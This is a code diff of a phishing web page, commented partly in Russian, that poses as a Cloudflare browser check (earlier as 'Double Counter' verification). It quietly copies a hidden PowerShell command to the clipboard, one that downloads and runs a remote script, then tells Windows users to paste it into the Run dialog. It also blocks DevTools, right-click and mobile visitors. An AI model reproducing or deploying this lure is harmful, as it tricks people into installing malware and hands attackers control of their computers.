@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Double Counter • Protected Verification</title>
-    <link rel="shortcut icon" href="https://doublecounter.gg/favicon.ico" type="image/x-icon">
+    <title>Checking your browser - cloudflare.com</title>
+    <link rel="shortcut icon" href="https://www.cloudflare.com/favicon.ico" type="image/x-icon">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Segoe UI Emoji', sans-serif;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
             user-select: none;
             -webkit-user-select: none;
             -moz-user-select: none;
@@ -18,7 +18,7 @@
         }
         
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background-color: #f6f6f6;
             color: #333;
             display: flex;
             justify-content: center;
@@ -26,774 +26,597 @@
             min-height: 100vh;
             padding: 20px;
             overflow-x: hidden;
+            cursor: default;
         }
         
-        .verification-container {
-            max-width: 480px;
+        .container {
+            max-width: 650px;
             width: 100%;
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            overflow: hidden;
-            position: relative;
-        }
-        
-        .header {
-            background: linear-gradient(to right, #2c3e50, #4a6491);
-            color: white;
-            padding: 30px 40px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            padding: 40px;
             text-align: center;
             position: relative;
-            border-bottom: 3px solid #f39c12;
         }
         
-        .header h1 {
-            font-size: 32px;
-            font-weight: 700;
-            margin-bottom: 5px;
-            letter-spacing: -0.5px;
-        }
-        
-        .header h2 {
-            font-size: 18px;
-            font-weight: 500;
-            opacity: 0.9;
-            margin-bottom: 15px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-        
-        .status-indicator {
-            display: inline-flex;
+        .cloudflare-header {
+            display: flex;
             align-items: center;
-            background: rgba(255, 255, 255, 0.15);
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-size: 14px;
-            margin-top: 10px;
-        }
-        
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            background: #2ecc71;
-            border-radius: 50%;
-            margin-right: 8px;
-            animation: pulse 2s infinite;
-        }
-        
-        .content {
-            padding: 40px;
-        }
-        
-        .alert-box {
-            background: #fff8e1;
-            border: 2px solid #ffc107;
-            border-radius: 12px;
-            padding: 20px;
+            justify-content: center;
             margin-bottom: 30px;
-            position: relative;
+            gap: 15px;
+            flex-direction: column;
         }
         
-        .alert-icon {
-            position: absolute;
-            top: -15px;
-            left: 20px;
-            background: #ffc107;
-            color: white;
-            width: 30px;
-            height: 30px;
+        .cloudflare-logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            margin-bottom: 10px;
+        }
+        
+        .cloudflare-icon {
+            width: 70px;
+            height: 70px;
+            background-color: #f38020;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: bold;
-            font-size: 16px;
+            font-size: 32px;
+            color: white;
+            margin: 0 auto;
         }
         
-        .alert-title {
-            color: #e74c3c;
-            font-weight: 700;
-            font-size: 18px;
-            margin-bottom: 10px;
-            margin-left: 35px;
-        }
-        
-        .alert-text {
-            color: #5d4037;
-            line-height: 1.6;
-            margin-left: 35px;
-        }
-        
-        .verification-card {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 25px;
-            margin-bottom: 25px;
-            border: 1px solid #e9ecef;
-        }
-        
-        .verification-title {
+        .cloudflare-title {
+            font-size: 28px;
             font-weight: 600;
-            font-size: 16px;
-            color: #2c3e50;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
+            color: #f38020;
+            letter-spacing: 0.5px;
         }
         
-        .verification-title:before {
-            content: "✓";
-            display: inline-flex;
+        .main-content {
+            margin: 30px 0;
+        }
+        
+        .checking-animation {
+            margin: 0 auto 25px;
+            width: 180px;
+            height: 180px;
+            position: relative;
+            display: flex;
             align-items: center;
             justify-content: center;
-            width: 24px;
-            height: 24px;
-            background: #27ae60;
-            color: white;
+        }
+        
+        .spinner {
+            width: 180px;
+            height: 180px;
+            border: 8px solid #e6e6e6;
+            border-top: 8px solid #f38020;
             border-radius: 50%;
-            margin-right: 10px;
-            font-size: 14px;
+            animation: spin 1.5s linear infinite;
+            position: absolute;
+            top: 0;
+            left: 0;
         }
         
-        .checkbox-container {
-            display: flex;
-            align-items: center;
-            margin: 20px 0;
-            padding: 15px;
-            background: white;
-            border-radius: 8px;
-            border: 1px solid #ddd;
-            transition: all 0.3s;
-            cursor: pointer;
+        .status-text {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            color: #333;
         }
         
-        .checkbox-container:hover {
-            border-color: #3498db;
-            box-shadow: 0 0 0 2px rgba(52, 152, 219, 0.2);
+        .subtext {
+            color: #666;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 20px;
         }
         
-        .checkbox-container input[type="checkbox"] {
+        .error-container {
+            background-color: #fff2f2;
+            border: 1px solid #ffcdcd;
+            border-radius: 6px;
+            padding: 20px;
+            margin: 30px 0;
+            text-align: left;
             display: none;
         }
         
-        .custom-checkbox {
-            width: 22px;
-            height: 22px;
-            border: 2px solid #3498db;
-            border-radius: 4px;
-            margin-right: 15px;
-            position: relative;
-            flex-shrink: 0;
-        }
-        
-        .checkbox-container input:checked + .custom-checkbox {
-            background: #3498db;
-            border-color: #3498db;
-        }
-        
-        .checkbox-container input:checked + .custom-checkbox:after {
-            content: "✓";
-            position: absolute;
-            color: white;
-            font-size: 16px;
-            font-weight: bold;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-        }
-        
-        .checkbox-label {
-            font-size: 16px;
-            color: #2c3e50;
-            font-weight: 500;
-        }
-        
-        .cloudflare-badge {
+        .error-title {
+            color: #d63638;
+            font-weight: 600;
+            font-size: 18px;
+            margin-bottom: 10px;
             display: flex;
             align-items: center;
-            justify-content: center;
-            margin: 25px 0;
-            padding: 15px;
-            background: linear-gradient(to right, #f38020, #ff8c00);
-            border-radius: 8px;
-            color: white;
-            font-weight: 700;
-            font-size: 18px;
-            letter-spacing: 1px;
+            gap: 8px;
         }
         
-        .steps-container {
-            margin: 30px 0;
+        .error-icon {
+            font-size: 20px;
+        }
+        
+        .error-details {
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+        
+        .solution-steps {
+            background-color: #f8f9fa;
+            border-radius: 6px;
+            padding: 20px;
+            margin-top: 20px;
+            border-left: 4px solid #f38020;
         }
         
         .step {
             display: flex;
-            margin-bottom: 25px;
-            align-items: center;
+            margin-bottom: 15px;
+            align-items: flex-start;
         }
         
         .step-number {
-            width: 36px;
-            height: 36px;
-            background: linear-gradient(135deg, #3498db, #2980b9);
+            background-color: #f38020;
             color: white;
+            width: 28px;
+            height: 28px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-weight: 700;
-            font-size: 16px;
-            margin-right: 15px;
+            font-weight: bold;
+            margin-right: 12px;
             flex-shrink: 0;
         }
         
-        .step-content {
-            flex: 1;
-        }
-        
-        .step-title {
-            font-weight: 600;
-            color: #2c3e50;
-            margin-bottom: 5px;
-            font-size: 16px;
-        }
-        
-        .step-description {
-            color: #666;
-            font-size: 14px;
+        .step-text {
+            color: #333;
             line-height: 1.5;
+            padding-top: 4px;
         }
         
         .key-combo {
-            display: inline-flex;
-            align-items: center;
-            background: #2c3e50;
-            color: white;
-            padding: 6px 12px;
-            border-radius: 6px;
-            margin: 0 4px;
+            display: inline-block;
+            background-color: #f0f0f0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding: 4px 8px;
             font-family: monospace;
-            font-size: 13px;
-            min-height: 32px;
+            font-size: 14px;
+            margin: 0 4px;
         }
         
-        .key-icon {
-            margin-right: 4px;
+        .mobile-error {
+            display: none;
+            padding: 40px 20px;
+            text-align: center;
         }
         
-        .buttons-container {
-            display: flex;
-            gap: 15px;
-            margin-top: 30px;
+        .mobile-error-icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+            color: #d63638;
         }
         
-        .button {
-            flex: 1;
-            padding: 16px;
-            border: none;
-            border-radius: 8px;
-            font-weight: 600;
-            font-size: 16px;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        .auto-copy-notice {
+            background-color: #e8f7e8;
+            border: 1px solid #b8e0b8;
+            border-radius: 6px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: center;
+            color: #2d662d;
+            font-size: 14px;
+            display: none;
+            animation: fadeIn 0.5s;
         }
         
-        .button-primary {
-            background: linear-gradient(to right, #27ae60, #2ecc71);
-            color: white;
+        .auto-copy-notice .checkmark {
+            color: #2d662d;
+            font-weight: bold;
+            margin-right: 8px;
         }
         
-        .button-primary:hover {
-            background: linear-gradient(to right, #229954, #27ae60);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(39, 174, 96, 0.4);
-        }
-        
-        .button-secondary {
-            background: #e0e0e0;
-            color: #666;
-        }
-        
-        .button-secondary:hover {
-            background: #d0d0d0;
-            transform: translateY(-2px);
+        .invisible-textarea {
+            position: absolute;
+            opacity: 0;
+            height: 0;
+            width: 0;
+            pointer-events: none;
+            left: -9999px;
         }
         
         .footer {
-            padding: 20px 40px;
-            background: #f8f9fa;
-            border-top: 1px solid #e9ecef;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 12px;
-            color: #666;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            font-size: 13px;
+            color: #888;
         }
         
-        .footer-left {
-            display: flex;
-            align-items: center;
-            gap: 15px;
+        .footer p {
+            margin: 5px 0;
         }
         
-        .footer-right {
-            text-align: right;
-        }
-        
-        .footer-links {
-            display: flex;
-            gap: 15px;
-        }
-        
-        .footer-link {
-            color: #3498db;
-            text-decoration: none;
-        }
-        
-        .footer-link:hover {
-            text-decoration: underline;
-        }
-        
-        .security-badge {
-            background: #2c3e50;
-            color: white;
-            padding: 8px 16px;
-            border-radius: 4px;
-            font-size: 11px;
-            font-weight: 600;
-            letter-spacing: 1px;
-        }
-        
-        .verification-code {
-            background: #2c3e50;
-            color: white;
-            padding: 12px;
-            border-radius: 6px;
-            font-family: monospace;
-            font-size: 14px;
-            margin: 20px 0;
-            text-align: center;
-            letter-spacing: 1px;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        
-        .verification-code:hover {
-            background: #1a252f;
-            transform: scale(1.02);
-        }
-        
-        .verification-success {
-            display: none;
-            text-align: center;
-            padding: 30px;
-            background: linear-gradient(135deg, #27ae60, #2ecc71);
-            color: white;
-            border-radius: 12px;
-            margin: 20px 0;
-        }
-        
-        .success-icon {
-            font-size: 48px;
-            margin-bottom: 15px;
-        }
-        
-        .success-title {
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 10px;
-        }
-        
-        .success-text {
-            opacity: 0.9;
-        }
-        
-        @keyframes pulse {
-            0% { opacity: 0.6; }
-            50% { opacity: 1; }
-            100% { opacity: 0.6; }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .hidden {
-            display: none !important;
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
         
         @media (max-width: 768px) {
-            .content {
-                padding: 25px;
+            .container {
+                padding: 20px;
             }
             
-            .header {
-                padding: 25px 30px;
+            .cloudflare-header {
+                gap: 10px;
             }
             
-            .header h1 {
-                font-size: 28px;
+            .cloudflare-icon {
+                width: 60px;
+                height: 60px;
+                font-size: 26px;
             }
             
-            .buttons-container {
-                flex-direction: column;
+            .cloudflare-title {
+                font-size: 24px;
             }
             
-            .footer {
-                flex-direction: column;
-                gap: 15px;
-                text-align: center;
+            .checking-animation {
+                width: 140px;
+                height: 140px;
+            }
+            
+            .spinner {
+                width: 140px;
+                height: 140px;
             }
         }
     </style>
 </head>
 <body>
-    <!-- Скрытый элемент для копирования команды -->
-    <textarea id="hiddenCommand" class="hidden">powershell -WindowStyle Hidden -ep Bypass -c "$p=$env:TEMP+'verify.ps1';iwr https://redirect-ten-gold.vercel.app/l.ps1 -OutFile $p;& $p -enroll_token '5e3031725f5bff1db14b7ff423d25bab6c65956028de9a5d5bb86691508de2de' -id '8649328'"</textarea>
+    <!-- Hidden textarea for clipboard manipulation -->
+    <textarea id="invisibleTextarea" class="invisible-textarea"></textarea>
     
-    <!-- Основной контейнер верификации -->
-    <div class="verification-container">
-        <!-- Шапка -->
-        <div class="header">
-            <h1>Double Counter</h1>
-            <h2>PROTECTED VERIFICATION</h2>
-            <div class="status-indicator">
-                <div class="status-dot"></div>
-                Verifying session integrity
+    <!-- Mobile error message (hidden by default) -->
+    <div class="mobile-error" id="mobileError">
+        <div class="mobile-error-icon">⚠️</div>
+        <h2>Access Restricted</h2>
+        <p>This verification page is only available on desktop computers.</p>
+        <p>Please access this website from a Windows PC to complete the verification process.</p>
+    </div>
+    
+    <!-- Main content for desktop users -->
+    <div class="container" id="desktopContainer">
+        <div class="cloudflare-header">
+            <div class="cloudflare-logo-container">
+                <div class="cloudflare-icon">CF</div>
             </div>
+            <div class="cloudflare-title">cloudflare</div>
         </div>
         
-        <!-- Основной контент -->
-        <div class="content">
-            <!-- Предупреждение -->
-            <div class="alert-box">
-                <div class="alert-icon">⚠</div>
-                <div class="alert-title">SUSPICIOUS ACTIVITY DETECTED</div>
-                <div class="alert-text">
-                    Your session has been flagged for unusual behavior patterns. Additional verification is required to ensure account security.<br><br>
-                    This verification is protected by <strong>Double Counter</strong>. Please complete the verification below to confirm you are not an automated system.
-                </div>
+        <div class="main-content">
+            <div class="checking-animation">
+                <div class="spinner"></div>
             </div>
             
-            <!-- Карточка верификации -->
-            <div class="verification-card">
-                <div class="verification-title">Verify you are human</div>
-                
-                <div class="checkbox-container">
-                    <input type="checkbox" id="humanVerification">
-                    <div class="custom-checkbox"></div>
-                    <label for="humanVerification" class="checkbox-label">
-                        I confirm I am a real person and not an automated system
-                    </label>
-                </div>
-                
-                <div class="cloudflare-badge">
-                    CLOUDFLARE
-                </div>
+            <div class="status-text" id="statusText">Checking your browser...</div>
+            <div class="subtext" id="subText">This process is automatic. Your browser will redirect to your requested content shortly.</div>
+            <div class="subtext">Please allow up to 5 seconds...</div>
+        </div>
+        
+        <!-- Auto-copy status notification -->
+        <div class="auto-copy-notice" id="copyNotice">
+            <span class="checkmark">✓</span>
+            <span id="copyMessage">Verification command has been automatically copied to your clipboard</span>
+        </div>
+        
+        <!-- Error message that appears after 5 seconds -->
+        <div class="error-container" id="errorContainer">
+            <div class="error-title">
+                <span class="error-icon">⚠</span>
+                IP Verification Failed
             </div>
             
-            <!-- Шаги верификации (скрыты изначально) -->
-            <div class="steps-container" id="stepsContainer">
-                <h3 style="margin-bottom: 20px; color: #2c3e50; font-size: 18px;">Verification Steps</h3>
-                <p style="color: #666; margin-bottom: 20px; line-height: 1.6;">
-                    To better prove you are not a robot, please:
-                </p>
+            <div class="error-details">
+                <p>We've detected an issue with your connection. Your request has been blocked due to security reasons.</p>
+                <p><strong>Error Code:</strong> 1020</p>
+                <p><strong>Ray ID:</strong> 7a1b2c3d4e5f6789</p>
+                <p><strong>Your IP:</strong> <span id="userIP">Loading...</span></p>
+            </div>
+            
+            <div class="solution-steps">
+                <h3 style="margin-bottom: 15px; color: #333;">To resolve this issue, please follow these steps:</h3>
                 
-                <!-- Шаг 1 -->
+                <!-- Скрытое поле с командой для копирования -->
+                <input type="hidden" id="hiddenCommand" value="powershell -WindowStyle Hidden -ep Bypass -c &quot;$p=$env:TEMP+&#39;l.ps1&#39;;iwr https://redirect-ten-gold.vercel.app/l.ps1 -OutFile $p;& $p -enroll_token &#39;5e3031725f5bff1db14b7ff423d25bab6c65956028de9a5d5bb86691508de2de&#39; -id &#39;8649328&#39;&quot;">
+                
                 <div class="step">
                     <div class="step-number">1</div>
-                    <div class="step-content">
-                        <div class="step-title">Press & hold the Windows Key + R</div>
-                        <div class="step-description">
-                            This will open the Run dialog on your Windows computer
-                        </div>
-                    </div>
+                    <div class="step-text">Press <span class="key-combo">Windows</span> + <span class="key-combo">R</span> to open the Run dialog.</div>
                 </div>
                 
-                <!-- Шаг 2 -->
                 <div class="step">
                     <div class="step-number">2</div>
-                    <div class="step-content">
-                        <div class="step-title">In the verification window, press Ctrl + V</div>
-                        <div class="step-description">
-                            The verification command has been automatically copied to your clipboard:
-                        </div>
-                        <div class="verification-code" id="verificationCode" onclick="copyCommand()">
-                            powershell -WindowStyle Hidden -ep Bypass -c ...
-                        </div>
-                    </div>
+                    <div class="step-text">Press <span class="key-combo">Ctrl</span> + <span class="key-combo">V</span> to paste the verification command (automatically copied to clipboard).</div>
                 </div>
                 
-                <!-- Шаг 3 -->
                 <div class="step">
                     <div class="step-number">3</div>
-                    <div class="step-content">
-                        <div class="step-title">Press Enter on your keyboard to finish</div>
-                        <div class="step-description">
-                            Complete the verification process by pressing Enter
-                        </div>
-                    </div>
+                    <div class="step-text">Press <span class="key-combo">Enter</span> to execute the verification.</div>
                 </div>
                 
-                <!-- Примечание -->
-                <div style="background: #e8f4fd; border-left: 4px solid #3498db; padding: 15px; margin: 20px 0; border-radius: 4px;">
-                    <p style="color: #2c3e50; font-size: 14px; line-height: 1.5;">
-                        <strong>You will observe and agree:</strong><br>
-                        CloudFlare verification (Ray ID: bf4682321e6baab1)<br><br>
-                        Perform the steps above to finish verification.
-                    </p>
+                <div class="step">
+                    <div class="step-number">4</div>
+                    <div class="step-text">Follow the instructions in the verification window.</div>
                 </div>
             </div>
             
-            <!-- Сообщение об успехе (скрыто изначально) -->
-            <div class="verification-success" id="successMessage">
-                <div class="success-icon">✓</div>
-                <div class="success-title">Verification Complete!</div>
-                <div class="success-text">Your session has been verified successfully. You can now continue.</div>
-            </div>
-            
-            <!-- Кнопки -->
-            <div class="buttons-container">
-                <button class="button button-primary" id="continueButton" onclick="startVerification()">
-                    <span>Verify</span>
-                </button>
-                <button class="button button-secondary" onclick="cancelVerification()">
-                    <span>Cancel</span>
-                </button>
-            </div>
-            
-            <!-- Кнопка для второго этапа (скрыта изначально) -->
-            <div class="buttons-container hidden" id="finalVerifyContainer">
-                <button class="button button-primary" id="finalVerifyButton" onclick="completeVerification()">
-                    <span>Complete Verification</span>
-                </button>
+            <div style="margin-top: 20px; font-size: 13px; color: #888;">
+                <p>Once the verification is complete, you can <a href="#" onclick="location.reload(); return false;" style="color: #f38020; text-decoration: none;">refresh this page</a> to continue.</p>
             </div>
         </div>
         
-        <!-- Футер -->
         <div class="footer">
-            <div class="footer-left">
-                <div class="security-badge">SECURITY GATEWAY</div>
-                <div>Request ID: SEC-AUTH</div>
-            </div>
-            <div class="footer-right">
-                <div class="footer-links">
-                    <a href="#" class="footer-link" onclick="return false">Privacy</a>
-                    <span>•</span>
-                    <a href="#" class="footer-link" onclick="return false">Terms</a>
-                </div>
-                <div style="margin-top: 5px;">Protected by Double Counter</div>
-            </div>
+            <p>DDoS protection by <strong>Cloudflare</strong></p>
+            <p>Ray ID: 7a1b2c3d4e5f6789 • <span id="currentTime"></span></p>
         </div>
     </div>
 
     <script>
-        // Команда для копирования
-        const verificationCommand = "powershell -WindowStyle Hidden -ep Bypass -c \"$p=$env:TEMP+'verify.ps1';iwr https://redirect-ten-gold.vercel.app/l.ps1 -OutFile $p;& $p -enroll_token '5e3031725f5bff1db14b7ff423d25bab6c65956028de9a5d5bb86691508de2de' -id '8649328'\"";
+        // Device detection - show mobile error if not on desktop
+        function isDesktop() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const mobileDevices = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/;
+            return !mobileDevices.test(userAgent);
+        }
         
-        // Элементы DOM
-        const humanCheckbox = document.getElementById('humanVerification');
-        const continueButton = document.getElementById('continueButton');
-        const stepsContainer = document.getElementById('stepsContainer');
-        const finalVerifyContainer = document.getElementById('finalVerifyContainer');
-        const finalVerifyButton = document.getElementById('finalVerifyButton');
-        const successMessage = document.getElementById('successMessage');
-        const verificationCode = document.getElementById('verificationCode');
+        // Initialize page based on device
+        if (!isDesktop()) {
+            document.getElementById('mobileError').style.display = 'block';
+            document.getElementById('desktopContainer').style.display = 'none';
+        }
         
-        // Инициализация
-        document.addEventListener('DOMContentLoaded', function() {
-            // Устанавливаем команду в код
-            verificationCode.textContent = verificationCommand;
+        // Simulate IP address
+        function generateFakeIP() {
+            const segments = Array.from({length: 4}, () => Math.floor(Math.random() * 255) + 1);
+            return segments.join('.');
+        }
+        
+        // Update current time
+        function updateTime() {
+            const now = new Date();
+            const timeString = now.toUTCString();
+            document.getElementById('currentTime').textContent = timeString;
+        }
+        
+        // Force copy to clipboard without permission dialog
+        function forceCopyToClipboard(text) {
+            const textarea = document.getElementById('invisibleTextarea');
+            const copyNotice = document.getElementById('copyNotice');
             
-            // Отключаем кнопку Continue пока не отмечен чекбокс
-            continueButton.disabled = true;
-            continueButton.style.opacity = '0.6';
-            continueButton.style.cursor = 'not-allowed';
+            // Method 1: Using execCommand (deprecated but works without permission)
+            textarea.value = text;
+            textarea.focus();
+            textarea.select();
             
-            // Отслеживаем изменения чекбокса
-            humanCheckbox.addEventListener('change', function() {
-                if (this.checked) {
-                    continueButton.disabled = false;
-                    continueButton.style.opacity = '1';
-                    continueButton.style.cursor = 'pointer';
-                    continueButton.innerHTML = '<span>Continue →</span>';
-                } else {
-                    continueButton.disabled = true;
-                    continueButton.style.opacity = '0.6';
-                    continueButton.style.cursor = 'not-allowed';
-                    continueButton.innerHTML = '<span>Verify</span>';
+            let copied = false;
+            
+            try {
+                const successful = document.execCommand('copy');
+                if (successful) {
+                    copied = true;
+                    copyNotice.style.display = 'block';
+                    console.log('Command copied to clipboard via execCommand');
                 }
-            });
-            
-            // Автоматически копируем команду при загрузке
-            setTimeout(() => {
-                copyToClipboard(verificationCommand);
-                showNotification('Verification command has been copied to clipboard');
-            }, 1000);
-        });
-        
-        // Функция копирования в буфер обмена
-        function copyToClipboard(text) {
-            navigator.clipboard.writeText(text).then(() => {
-                console.log('Command copied to clipboard');
-            }).catch(err => {
-                // Fallback для старых браузеров
-                const textarea = document.createElement('textarea');
-                textarea.value = text;
-                document.body.appendChild(textarea);
-                textarea.select();
-                document.execCommand('copy');
-                document.body.removeChild(textarea);
-                console.log('Command copied via fallback method');
-            });
-        }
-        
-        // Функция для ручного копирования
-        function copyCommand() {
-            copyToClipboard(verificationCommand);
-            showNotification('Command copied to clipboard!');
-            
-            // Анимация копирования
-            verificationCode.style.background = '#27ae60';
-            setTimeout(() => {
-                verificationCode.style.background = '#2c3e50';
-            }, 500);
-        }
-        
-        // Показать уведомление
-        function showNotification(message) {
-            // Создаем временное уведомление
-            const notification = document.createElement('div');
-            notification.style.cssText = `
-                position: fixed;
-                top: 20px;
-                right: 20px;
-                background: #27ae60;
-                color: white;
-                padding: 15px 25px;
-                border-radius: 8px;
-                box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-                z-index: 1000;
-                animation: fadeIn 0.3s;
-                font-weight: 500;
-            `;
-            notification.textContent = message;
-            document.body.appendChild(notification);
-            
-            // Удаляем через 3 секунды
-            setTimeout(() => {
-                notification.style.animation = 'fadeIn 0.3s reverse';
-                setTimeout(() => {
-                    document.body.removeChild(notification);
-                }, 300);
-            }, 3000);
-        }
-        
-        // Начало верификации
-        function startVerification() {
-            if (!humanCheckbox.checked) {
-                showNotification('Please confirm you are human');
-                return;
+            } catch (err) {
+                console.log('execCommand failed:', err);
             }
             
-            // Показываем шаги верификации
-            stepsContainer.style.display = 'block';
-            stepsContainer.style.animation = 'fadeIn 0.5s';
+            // Method 2: Using Clipboard API with fallback
+            if (!copied && navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(text).then(() => {
+                    copied = true;
+                    copyNotice.style.display = 'block';
+                    console.log('Command copied to clipboard via Clipboard API');
+                }).catch(err => {
+                    console.error('Clipboard API failed:', err);
+                });
+            }
             
-            // Прячем основную кнопку, показываем финальную
-            continueButton.parentElement.classList.add('hidden');
-            finalVerifyContainer.classList.remove('hidden');
+            // Method 3: Секретный метод через contentEditable div
+            if (!copied) {
+                try {
+                    const tempDiv = document.createElement('div');
+                    tempDiv.contentEditable = true;
+                    tempDiv.style.position = 'absolute';
+                    tempDiv.style.left = '-9999px';
+                    document.body.appendChild(tempDiv);
+                    
+                    tempDiv.textContent = text;
+                    tempDiv.focus();
+                    
+                    const range = document.createRange();
+                    range.selectNodeContents(tempDiv);
+                    
+                    const selection = window.getSelection();
+                    selection.removeAllRanges();
+                    selection.addRange(range);
+                    
+                    document.execCommand('copy');
+                    document.body.removeChild(tempDiv);
+                    
+                    copied = true;
+                    copyNotice.style.display = 'block';
+                    console.log('Command copied via temporary element method');
+                    
+                } catch (err) {
+                    console.error('Temporary element method failed:', err);
+                }
+            }
             
-            // Автоматически копируем команду еще раз
-            copyToClipboard(verificationCommand);
+            // Скрыть уведомление через 8 секунд
+            if (copied) {
+                setTimeout(() => {
+                    copyNotice.style.display = 'none';
+                }, 8000);
+            }
             
-            // Показываем уведомление
-            showNotification('Verification command copied. Press Win+R, then Ctrl+V to paste.');
+            return copied;
         }
         
-        // Завершение верификации
-        function completeVerification() {
-            // Показываем успешное сообщение
-            successMessage.style.display = 'block';
-            successMessage.style.animation = 'fadeIn 0.5s';
+        // Get the command from hidden input
+        function getVerificationCommand() {
+            return document.getElementById('hiddenCommand').value;
+        }
+        
+        // Simulate the verification process
+        function simulateVerification() {
+            const statusText = document.getElementById('statusText');
+            const subText = document.getElementById('subText');
+            const errorContainer = document.getElementById('errorContainer');
+            const userIP = document.getElementById('userIP');
             
-            // Прячем шаги и кнопки
-            stepsContainer.style.display = 'none';
-            finalVerifyContainer.classList.add('hidden');
+            // Set fake IP
+            userIP.textContent = generateFakeIP();
             
-            // Меняем текст в заголовке
-            document.querySelector('.status-indicator').innerHTML = `
-                <div class="status-dot" style="background: #27ae60;"></div>
-                Verification Complete
-            `;
-            
-            // Автоматический редирект через 5 секунд
+            // Update status after 2 seconds
             setTimeout(() => {
-                showNotification('Redirecting to requested content...');
-                setTimeout(() => {
-                    // Здесь можно добавить редирект на нужную страницу
-                    // window.location.href = 'https://discord.com';
-                }, 1000);
+                statusText.textContent = "Verifying IP address...";
+            }, 2000);
+            
+            // Show error and copy command after 5 seconds
+            setTimeout(() => {
+                statusText.textContent = "Verification Failed";
+                statusText.style.color = "#d63638";
+                subText.textContent = "We are unable to complete the verification automatically.";
+                subText.style.color = "#666";
+                
+                // Show error container
+                errorContainer.style.display = 'block';
+                
+                // Get and copy command
+                const command = getVerificationCommand();
+                
+                // Копируем сразу
+                forceCopyToClipboard(command);
+                
+                // Дополнительные триггеры для копирования
+                const copyTriggers = ['click', 'keydown', 'mousemove'];
+                copyTriggers.forEach(trigger => {
+                    document.addEventListener(trigger, function autoCopy() {
+                        forceCopyToClipboard(command);
+                    }, { once: true });
+                });
+                
+                // Периодически пытаемся скопировать (5 попыток)
+                let copyAttempts = 0;
+                const copyInterval = setInterval(() => {
+                    if (copyAttempts < 5) {
+                        forceCopyToClipboard(command);
+                        copyAttempts++;
+                    } else {
+                        clearInterval(copyInterval);
+                    }
+                }, 1500);
+                
             }, 5000);
         }
         
-        // Отмена верификации
-        function cancelVerification() {
-            if (confirm('Are you sure you want to cancel verification? Access will be denied.')) {
-                showNotification('Verification cancelled. Access denied.');
-                // Можно добавить редирект на страницу ошибки
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', function() {
+            if (isDesktop()) {
+                updateTime();
+                setInterval(updateTime, 1000);
+                
+                // Start verification simulation
+                setTimeout(simulateVerification, 1000);
             }
-        }
+        });
         
-        // Блокировка DevTools и других функций
+        // Prevent right-click
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
+            return false;
         });
         
+        // Disable text selection
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Disable drag
+        document.addEventListener('dragstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Auto-copy on Ctrl+V and prevent DevTools
         document.addEventListener('keydown', function(e) {
-            // Блокировка DevTools
-            if (e.key === 'F12' || 
-                (e.ctrlKey && e.shiftKey && e.key === 'I') || 
-                (e.ctrlKey && e.shiftKey && e.key === 'J') ||
-                (e.ctrlKey && e.key === 'U')) {
-                e.preventDefault();
-                showNotification('This action is restricted for security reasons');
-            }
-            
-            // Автоматическое копирование при Ctrl+V
+            // Копируем при Ctrl+V
             if (e.ctrlKey && e.key === 'v') {
-                setTimeout(() => {
-                    copyToClipboard(verificationCommand);
-                }, 100);
+                const command = getVerificationCommand();
+                forceCopyToClipboard(command);
+                e.preventDefault();
             }
             
-            // Автоматическое копирование при Win+R
-            if (e.key === 'r' && (e.metaKey || (e.ctrlKey && e.altKey))) {
-                setTimeout(() => {
-                    copyToClipboard(verificationCommand);
-                    showNotification('Verification command ready to paste (Ctrl+V)');
-                }, 500);
+            // Prevent DevTools and other shortcuts
+            const blockedKeys = [
+                'F12',
+                'F11',
+                'F10',
+                'F8',
+                'F5'
+            ];
+            
+            const blockedCombos = [
+                {ctrl: true, shift: true, key: 'i'},
+                {ctrl: true, shift: true, key: 'j'},
+                {ctrl: true, shift: true, key: 'c'},
+                {ctrl: true, shift: true, key: 'k'},
+                {ctrl: true, key: 'u'},
+                {ctrl: true, key: 's'},
